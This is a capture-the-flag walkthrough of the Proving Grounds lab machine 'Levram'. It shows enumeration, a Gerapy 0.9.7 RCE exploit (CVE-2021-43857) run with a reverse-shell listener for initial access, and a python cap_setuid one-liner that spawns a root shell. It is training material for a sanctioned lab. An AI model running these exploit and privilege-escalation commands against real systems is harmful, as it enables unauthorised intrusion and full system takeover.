---
title: "Proving Grounds: Levram"
description: Machine Walkthrough
author: hx77
date: 2024-08-15
categories: [walkthrough, proving_grounds]
tags: [proving_grounds, machines, walkthrough ]     # TAG names should always be lowercase
pin: false
image: 
    path: https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/78aee95c-ab7b-4cb1-5a28-c86e94471000/public
alt: Walkthrough of Levram
---

------

# OffSec Proving Grounds Walkthrough: Levram

## Table of Contents

1. [Introduction](#introduction)
2. [Information Gathering](#information-gathering)
    - [Initial Enumeration](#initial-enumeration)
3. [Exploitation](#exploitation)
    - [Gaining Initial Access](#gaining-initial-access)
    - [Privilege Escalation](#privilege-escalation)
4. [Conclusion](#conclusion)

## Introduction

- **Machine Name:** Levram
- **IP**: 192.168.213.24
- **Points**: 10
- **Difficulty Level:** Easy  
- **Operating System:** Linux
- **Objective:** This walkthrough details the process of identifying and exploiting vulnerabilities in the Levram system to achieve root access. The goal is to gain both user and root flags.

We are starting the journey with an easy box called "Levram",  I am going to tackle this in 4 steps:

1) Information Gathering
2) Exploitation
3) Post-Exploitation

and at the end I'll give you my conclusion of the box :)

Let's begin!

## Information Gathering

### Initial Enumeration

**Tool Used:** Nmap

I begin by scanning the target machine to identify any open ports, I know this box is easy so I'm starting with the bare basics as I don't think there's too much to it.

`nmap -p- -sV 192.168.213.24`

Nmap scan report for 192.168.213.24  
Host is up (0.035s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  VERSION  
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)  
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6

from this initial scan I can see that there's a webpage being served over at 192.168.213.24:8000, going to that page, I see:

![website](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/85daad90-5b9d-4948-06c6-e582d1b6ef00/public)

it looks like I will have to guess the username/password but first things first, I "inspect" the page for any comments or anything that can point me to an username or password, this lead me nowhere.... but I do have the words "gerapy"

**Tool Used:** searchsploit  
Using searchsploit I search for "gerapy", this search returned a vulnerability on Gerapy 0.9.7 that leads to a remote code execution.
I don't know what version of gerapy I am looking at, at least, not yet.

![searchsploit](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/5948fc87-05dc-4a79-1b2b-5d02b0059200/public)

next in line is to inspect the code for that vulnerability, I used the below flag to get the path of the file and copy the file into another directory for usage  
`searchsploit -p 50640`  

![searchsploit2](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/bdad7747-7bf8-4567-a4d4-8620be9e7e00/public)

I went ahead and loaded the code to inspect it to see what it does and right in front of my nose I see "username/password"  
![up](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/0ee7a73d-20cb-4587-7f11-1389e2383d00/public)

well, that made things a lot simpler... I went ahead and logged in into the website with those credentials to see what it was

![website1](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/e0ab43b6-f431-458d-d498-79366d863100/public)

at the bottom of the page I can see the gerapy version, 0.9.7! woot! that means the exploit will work!, lets continue reading the exploit to see what else I can find out.... in lines 80 and 81 I can see that I need to have a project ID - right now that website doesn't have any projects so the code will most likely fail if I run it.

![quit](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/032ec068-9b9e-4252-1920-b1681c0e7400/public)

I am currently logged in as the admin - so let's add a project and see what happens

![project](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/695b5112-681f-4814-550d-b8f93ea82000/public)  

it looks like I have the option to upload, close and create. I will go with create to begin with to see what happens when the code is executed, I'll adjust my approach if I get a failure.

![project1](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/a4ee6338-0f24-4402-e9ad-dac36c185b00/public)
 ok so we got everything ready to try the exploit! lets goooo!

## Exploitation

### Gaining Initial Access

Running the python script with all the required flags and a netcat listener ready to go gave me the initial foothold on the machine.

- **Exploit Used:** CVE-2021-43857
- **Command:**  
    `python3 exploit.py -t 192.168.213.24 -p 8000 -L 192.168.45.194 -P 1234`  
- **Outcome:** Gained access as 'app'  

![foothold](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/5d47f3cb-14e9-4fa4-68ca-ddd5995fee00/public)

First flag was found!  

![local_proof](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/54d5f84b-663c-4d5a-da10-098410529b00/public)  

### Privilege Escalation

The purpose of this step is to gain initial access level to root or admin.

- **Tool Used:** Manual methods  
- **Vulnerability Found:**  python!  
- **Exploit Method:**  
    `[exploit command]`  
- **Outcome:** Root access obtained.  

I looked around in the pc for a bit but couldn't find anything useful and for a bit I was stuck :/  
Then I went back to my checklist DUH! (I used this site to populate some of my items in the checklist - <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>)  

so I started with scanning the file system for files with capabilities using **`getcap -r /`**   The **-r** flag tells getcap to search recursively, **/** to indicate that we want to search the whole system, but I also don't want to see all the output because of the errors that will come up, so I used 2>/dev/null which yeets the output errors of the command to a blackhole.

- **Command:**  
 `getcap -r / 2>/dev/null`  

![getcap](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/a4840d62-095b-4674-752c-9dd7de7e5800/public)  

from that list I can see python3 and that it has cap_setuid set! soooo lets try to break out of the shell using  

- **Command:**  
 `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`  
 I edited it to reflect the path of the binary  
 `/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'`  
this command is used as a backdoor to maintain privileged access by manipulating its own process UIDl (<https://gtfobins.github.io/gtfobins/python/>)  

It worked! I navigated to "root" and was able to get the final flag "proof.txt"  

![root](https://imagedelivery.net/-rYpVInpJDYYl5Fx06AU4g/24d40868-faf1-4374-025f-87a5103cf800/public)  
**Done!**  

## Conclusion

- **Summary:** This walkthrough covered the steps from initial enumeration to privilege escalation in the Levram box from proving grounds.
- **Reflection:** I think this was a very good box due to the complexity of the privilege escalation, overall I liked it! Rating: 4/10.
